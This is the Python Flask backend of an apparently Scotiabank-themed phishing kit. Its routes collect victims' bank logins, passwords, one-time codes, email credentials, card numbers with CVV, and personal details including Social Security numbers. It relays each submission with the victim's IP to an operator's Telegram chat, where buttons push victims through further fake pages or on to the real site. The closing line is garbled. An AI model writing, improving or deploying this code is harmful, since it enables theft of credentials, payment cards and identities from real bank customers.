from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
import time
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")

SESSION_STATUS = {}
PAGES = [
    {"emoji": "🔐", "text": "LOGIN1", "page": "index.html"},
    {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
    {"emoji": "📧", "text": "EMAIL", "page": "email.html"},
    {"emoji": "🧾", "text": "C", "page": "c.html"},
    {"emoji": "🧍", "text": "PERSONAL", "page": "personal.html"},
    {"emoji": "🔑", "text": "LOGIN2", "page": "login2.html"},
    {"emoji": "🎉", "text": "THANK YOU", "page": "thnks.html"},
    # Special button for redirecting to the REAL website
    {"emoji": "🌐", "text": "GO TO SITE", "page": "redirect:https://www.google.com"},  # CHANGE THIS URL TO REAL BANK IF NEEDED
]

def set_webhook():
    webhook_url = "https://scotiabcknd.onrender.com/webhook"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    try:
        response = requests.get(url)
        print("Webhook set response:", response.json())
        return response.json()
    except Exception as e:
        print("Failed to set webhook:", str(e))
        return {"ok": False, "error": str(e)}

def send_to_telegram(data, session_id, type_):
    msg = f"<b>🔐 {type_.upper()} Submission</b>\n\n"
    for key, value in data.items():
        if isinstance(value, dict):
            msg += f"<b>{key.replace('_', ' ').title()}:</b>\n"
            for subkey, subvalue in value.items():
                msg += f"  <b>{subkey.replace('_', ' ').title()}:</b> <code>{subvalue}</code>\n"
        else:
            msg += f"<b>{key.replace('_', ' ').title()}:</b> <code>{value}</code>\n"
    msg += f"<b>Session ID:</b> <code>{session_id}</code>"

    inline_keyboard = [[
        {"text": f"{b['emoji']} {b['text']}", "callback_data": f"{session_id}:{b['page']}"}
    ] for b in PAGES]

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": inline_keyboard}
    }

    for attempt in range(3):
        try:
            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
            print("Telegram sent:", r.status_code, r.json())
            return r.ok
        except Exception as e:
            print(f"Telegram attempt {attempt + 1} failed:", str(e))
            time.sleep(2 ** attempt)
    return False

# === All your POST routes remain unchanged ===
@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    if not data or "login" not in data or "password" not in data:
        return jsonify({"success": False, "error": "Missing fields"}), 400

    login_id = data["login"]
    password = data["password"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "login", "approved": False, "redirect_url": None}

    if not send_to_telegram({"login_id": login_id, "password": password, "ip": ip}, session_id, "login"):
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/otp", methods=["POST"])
def otp():
    data = request.get_json()
    if not data or "otp" not in data:
        return jsonify({"success": False, "error": "Missing fields"}), 400

    otp = data["otp"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "otp", "approved": False, "redirect_url": None}

    if not send_to_telegram({"otp": otp, "ip": ip}, session_id, "otp"):
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/email", methods=["POST"])
def email():
    data = request.get_json()
    if not data or "email" not in data or "password" not in data:
        return jsonify({"success": False, "error": "Missing fields"}), 400

    email = data["email"]
    password = data["password"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "email", "approved": False, "redirect_url": None}

    if not send_to_telegram({"email": email, "password": password, "ip": ip}, session_id, "email"):
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/c", methods=["POST"])
def c():
    data = request.get_json()
    if not data or "data" not in data or "card_number" not in data["data"] or "exp_date" not in data["data"] or "cvv" not in data["data"]:
        return jsonify({"success": False, "error": "Missing fields"}), 400

    card_data = data["data"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "c", "approved": False, "redirect_url": None}

    if not send_to_telegram({"card_data": card_data, "ip": ip}, session_id, "c"):
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/personal", methods=["POST"])
def personal():
    data = request.get_json()
    required = ["full_name", "address", "city", "zip", "ssn"]
    if not data or not all(k in data for k in required):
        return jsonify({"success": False, "error": "Missing fields"}), 400

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "personal", "approved": False, "redirect_url": None}

    send_data = {k: data[k] for k in required}
    send_data["ip"] = ip

    if not send_to_telegram(send_data, session_id, "personal"):
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/login2", methods=["POST"])
def login2():
    data = request.get_json()
    if not data or "login2" not in data or "password2" not in data:
        return jsonify({"success": False, "error": "Missing fields"}), 400

    login2 = data["login2"]
    password2 = data["password2"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "login2", "approved": False, "redirect_url": None}

    if not send_to_telegram({"login2": login2, "password2": password2, "ip": ip}, session_id, "login2"):
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

@app.route("/thnks", methods=["POST"])
def thnks():
    data = request.get_json()
    if not data or "message" not in data:
        return jsonify({"success": False, "error": "Missing fields"}), 400

    message = data["message"]
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {"type": "thnks", "approved": False, "redirect_url": None}

    if not send_to_telegram({"message": message, "ip": ip}, session_id, "thnks"):
        return jsonify({"success": False, "error": "Telegram failed"}), 500

    return jsonify({"success": True, "id": session_id}), 200

# === FIXED WEBHOOK ===
@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json()
    if not update or "callback_query" not in update:
        return jsonify({"status": "ignored"}), 200

    try:
        callback_data = update["callback_query"]["data"]
        session_id, action = callback_data.split(":", 1)  # Split only on first colon

        if session_id not in SESSION_STATUS:
            return jsonify({"status": "unknown session"}), 404

        # Handle external redirect
        if action.startswith("redirect:"):
            redirect_url = action[len("redirect:"):]
            SESSION_STATUS[session_id]["approved"] = True
            SESSION_STATUS[session_id]["redirect_url"] = redirect_url
        # Handle internal page
        elif action in [b["page"] for b in PAGES if not b["page"].startswith("redirect:")]:
            SESSION_STATUS[session_id]["approved"] = True
            SESSION_STATUS[session_id]["redirect_url"] = action
        else:
            return jsonify({"status": "unknown action"}), 404

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print("Webhook error:", str(e))
        return jsonify({"status": "error", "error": str(e)}), 500

@app.route("/status/<session_id>", methods=["GET"])
def status(session_id):
    session = SESSION_STATUS.get(session_id)
    if not session:
        return jsonify({"error": "Not found"}), 404

    if session["approved"]:
        return jsonify({"status": "approved", "redirect_url": session["redirect_url"]}), 200
    return jsonify({"status": "pending"}), 200

if __name__ == "__main__":
    set_webhook()
    app.run()    app.run(host="0.0.0.0", port=port, debug=True)
